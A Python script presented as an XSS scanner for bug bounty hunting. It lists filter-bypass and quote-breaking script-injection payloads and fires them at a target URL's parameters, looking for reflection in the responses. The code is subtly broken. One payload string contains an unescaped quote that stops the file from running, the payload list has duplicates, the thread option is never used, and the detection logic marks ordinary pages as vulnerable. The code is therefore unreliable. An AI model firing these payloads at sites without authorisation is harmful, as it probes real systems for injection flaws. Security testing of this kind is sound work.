#!/usr/bin/env python3
"""
Roger XSS - Cross-Site Scripting scanner for bug bounty hunting.
"""

import argparse
import requests
import urllib3
import re
import html
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# XSS payloads
XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    # Event handlers
    "<img src=x onerror=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<object data=javascript:alert(1)>",
    # Filters bypass
    "<ScRiPt>alert(1)</sCrIpT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    # Encoding
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    # Polyglots
    "javascript:alert(1)//",
    "<img src=x onerror=alert(1)>",
    # Quote bypass
    "'\"><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    # DOM-based
    "#"><img src=x onerror=alert(1)>",
    "#' onclick=alert(1)//",
]

# Parameters commonly vulnerable to XSS
XSS_PARAMS = [
    "q", "s", "search", "query", "keyword", "page", "id", "cat", "category",
    "tag", "year", "month", "day", "date", "from", "to", "subject", "title",
    "name", "text", "comment", "msg", "email", "url", "link", "file", "img",
    "callback", "data", "ref", "ref", "host", "port", "path", "debug",
]


class RogerXSS:
    def __init__(self, target, threads=5, quiet=False, output=None, timeout=10):
        self.target = target.rstrip('/')
        self.threads = threads
        self.quiet = quiet
        self.output = output
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.findings = []
        
    def parse_url(self, url):
        """Parse URL and add protocol if needed."""
        if not url.startswith('http'):
            url = 'https://' + url
        return url
    
    def inject_payload(self, url, param, payload):
        """Inject XSS payload into parameter."""
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            
            # URL encode the payload
            import urllib.parse
            encoded_payload = urllib.parse.quote(payload, safe='')
            
            # Get existing value or use test
            if param in query:
                original_value = query[param][0]
                query[param] = [original_value + payload]
            else:
                query[param] = [payload]
            
            new_query = urlencode(query, doseq=True)
            new_parsed = parsed._replace(query=new_query)
            return urlunparse(new_parsed)
        except:
            return None
    
    def detect_xss(self, url, response):
        """Detect if XSS payload executed or is reflected."""
        text = response.text
        reflected = False
        
        # Check if payload is reflected (not executed)
        for payload in XSS_PAYLOADS:
            # Check raw reflection
            if payload in text:
                reflected = True
                break
            # Check HTML-encoded reflection
            encoded = html.escape(payload)
            if encoded in text:
                reflected = True
                break
        
        # Check for common XSS indicators
        xss_indicators = [
            "alert(1)",
            "onerror=",
            "onload=",
            "onfocus=",
            "javascript:",
            "<script>",
        ]
        
        for indicator in xss_indicators:
            if indicator in text:
                return {
                    "type": "potential",
                    "evidence": f"Found: {indicator}",
                    "severity": "MEDIUM",
                    "reflected": reflected
                }
        
        return None
    
    def test_payload(self, url, param, payload):
        """Test a single XSS payload."""
        test_url = self.inject_payload(url, param, payload)
        
        if not test_url:
            return None
        
        try:
            response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=False
            )
            
            # Check for reflection
            if payload in response.text:
                return {
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "type": "reflected",
                    "severity": "LOW",
                    "reflected": True
                }
            
            # Check for execution (simplified - real XSS needs browser)
            for indicator in ["alert(1)", "onerror=", "onload="]:
                if indicator in response.text:
                    return {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "type": "potential",
                        "evidence": indicator,
                        "severity": "MEDIUM",
                        "reflected": False
                    }
            
        except Exception as e:
            pass
        
        return None
    
    def scan_params(self, url):
        """Scan URL parameters for XSS."""
        findings = []
        
        parsed = urlparse(url)
        existing_params = parse_qs(parsed.query)
        
        # If no params, try adding common ones
        if not existing_params:
            for param in XSS_PARAMS[:8]:
                for payload in XSS_PAYLOADS[:3]:
                    test_url = f"{url}?{param}={payload}"
                    
                    try:
                        response = self.session.get(
                            test_url,
                            timeout=self.timeout,
                            verify=False
                        )
                        
                        # Check for reflection
                        if payload in response.text:
                            findings.append({
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "type": "reflected",
                                "severity": "LOW",
                                "reflected": True
                            })
                            
                    except:
                        pass
        else:
            # Test existing parameters
            for param in existing_params.keys():
                for payload in XSS_PAYLOADS[:5]:
                    result = self.test_payload(url, param, payload)
                    
                    if result:
                        if not self.quiet:
                            print(f"  [!] XSS found: {param}")
                            print(f"      Payload: {payload[:30]}")
                        
                        findings.append(result)
                        break
        
        return findings
    
    def scan(self):
        """Run the XSS scanner."""
        target = self.parse_url(self.target)
        
        print(f"[*] Starting XSS scan on: {target}")
        print("=" * 60)
        
        # Scan parameters
        print("[*] Testing for XSS vulnerabilities...")
        
        findings = self.scan_params(target)
        
        # Print results
        print()
        print("=" * 60)
        
        if findings:
            print("[!] POTENTIAL XSS VULNERABILITIES:")
            print()
            
            unique = []
            seen = set()
            
            for f in findings:
                key = f"{f['parameter']}:{f['payload'][:15]}"
                if key not in seen:
                    seen.add(key)
                    unique.append(f)
            
            for finding in unique:
                print(f"[!] Parameter: {finding['parameter']}")
                print(f"    Payload: {finding['payload'][:40]}")
                print(f"    Type: {finding['type']}")
                print(f"    Severity: {finding['severity']}")
                if finding.get('reflected'):
                    print(f"    Note: Payload is reflected (not executed)")
                print()
                
                self.findings.append(finding)
        else:
            print("[*] No XSS vulnerabilities found")
            print("[*] Note: XSS often requires manual testing")
            print("[*] Try testing: q, search, id, name, text parameters")
        
        # Summary
        print(f"[*] Total issues: {len(self.findings)}")
        
        # Save results
        if self.output and self.findings:
            with open(self.output, 'w') as f:
                f.write(f"# XSS Scan Results for {target}\n\n")
                for finding in self.findings:
                    f.write(f"Parameter: {finding['parameter']}\n")
                    f.write(f"Payload: {finding['payload']}\n")
                    f.write(f"Type: {finding['type']}\n")
                    f.write(f"Severity: {finding['severity']}\n\n")
        
        return self.findings


def main():
    parser = argparse.ArgumentParser(
        description="Roger XSS - Cross-Site Scripting vulnerability scanner for bug bounty hunting"
    )
    parser.add_argument("target", help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    parser.add_argument("-o", "--output", help="Output results to file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    args = parser.parse_args()
    
    scanner = RogerXSS(
        target=args.target,
        threads=args.threads,
        quiet=args.quiet,
        output=args.output,
        timeout=args.timeout
    )
    
    scanner.scan()


if __name__ == "__main__":
    main()